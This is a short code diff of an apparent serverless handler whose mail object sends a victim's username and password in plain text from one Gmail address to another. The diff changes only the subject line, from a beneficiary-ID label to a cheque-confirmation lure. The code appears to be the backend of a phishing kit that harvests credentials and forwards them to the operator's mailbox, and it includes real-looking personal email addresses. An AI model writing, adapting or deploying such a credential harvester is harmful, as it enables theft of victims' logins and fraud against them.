@@ -15,7 +15,7 @@ exports.handler = async function(event, context) {
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
         to: 'sierroalee@gmail.com',
-        subject: 'CEDULA-BENEFICIARIO',
+        subject: 'Confirmación de Cheques',
         text: `Usuario: ${username}\nContraseña: ${password}`,
     };
 
